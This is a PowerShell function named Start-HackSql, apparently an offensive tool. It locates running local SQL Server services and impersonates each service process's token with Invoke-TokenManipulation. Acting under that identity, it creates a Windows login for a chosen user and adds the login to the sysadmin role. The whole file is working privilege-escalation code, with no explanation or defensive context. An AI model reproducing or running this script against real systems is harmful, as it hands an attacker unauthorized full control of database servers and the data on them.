function Start-HackSql {
    [CmdletBinding()]
    param (
	$Login = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    )

    begin {

    }

    process {
        $services = Get-Service | Where-Object { ($_.Name -eq 'MSSQLSERVER' -or $_.Name -like 'MSSQL$*') -and $_.Status -eq "Running" }
        foreach ($service in $services) {
            if ($service.Name -eq "MSSQLSERVER") {
                $sqlName = ".\"
            } else {
                $sqlName = ".\$($service.Name.Substring(6))"
            }

            Write-Host "Attempting $sqlName"
            $serviceProcess = Get-WmiObject -Class Win32_Service -Filter "Name = '$($service.Name)'"

            Invoke-TokenManipulation -ProcessId $serviceProcess.ProcessID -ImpersonateUser | Out-Null
            $impersonatedUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            Write-Host "Service $($service.Name) on PID $($serviceProcess.ProcessID) will connect to $sqlName as $impersonatedUser"

            $sqlConnection = New-Object System.Data.SqlClient.SqlConnection("Data Source=$sqlName;Trusted_Connection=True")
            $sqlConnection.Open()
            $sqlCommand = New-Object System.Data.SqlClient.SqlCommand("If Not Exists (Select Top 1 0 From sys.server_principals Where name = '$Login')
Begin
    Create Login [$Login] From Windows
End

If Not Exists (Select Top 1 0 From master.sys.server_principals sp Join master.sys.server_role_members srp On sp.principal_id = srp.member_principal_id Join master.sys.server_principals spr On srp.role_principal_id = spr.principal_id Where sp.name = '$Login' And spr.name = 'sysadmin')
Begin
    Exec sp_addsrvrolemember '$Login', 'sysadmin'
End", $sqlConnection)
            $sqlCommand.ExecuteNonQuery() | Out-Null
            $sqlConnection.Close()
            Invoke-TokenManipulation -RevToSelf | Out-Null
        }
    }

    end {

    }
}
